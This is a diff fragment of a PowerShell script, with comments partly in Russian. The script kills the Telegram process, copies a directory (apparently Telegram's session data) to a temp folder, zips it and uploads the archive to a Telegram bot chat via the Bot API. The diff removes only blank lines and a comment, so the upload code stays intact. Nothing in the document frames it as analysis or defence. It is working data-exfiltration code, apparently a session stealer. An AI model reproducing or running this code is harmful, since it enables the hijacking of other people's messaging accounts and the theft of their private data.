@@ -10,25 +10,18 @@ try {
         Stop-Process -Name Telegram -Force -ErrorAction Stop
         Start-Sleep -Milliseconds 500
     }
-
     if (!(Test-Path $s -PathType Container)) { throw "Source directory $s not found" }
     if (!(Test-Path $env:TEMP -PathType Container)) { throw "Temp directory $env:TEMP not found" }
-
     New-Item $t -ItemType Directory -Force -ErrorAction Stop | Out-Null
     Copy-Item "$s\*" $t -Recurse -Force -ErrorAction Stop
     Compress-Archive "$t\*" $z -Force -ErrorAction Stop
-
     if (!(Test-Path $z -PathType Leaf)) { throw "Zip file $z not created" }
-
-    # Готовим данные для отправки через Telegram Bot API
     $Form = @{
         chat_id  = $c
         document = Get-Item $z
     }
-
     $uri = "https://api.telegram.org/bot$b/sendDocument"
     Invoke-RestMethod -Uri $uri -Method Post -Form $Form -ErrorAction Stop
-
 } catch {
     Write-Error "Error: $_"
     throw
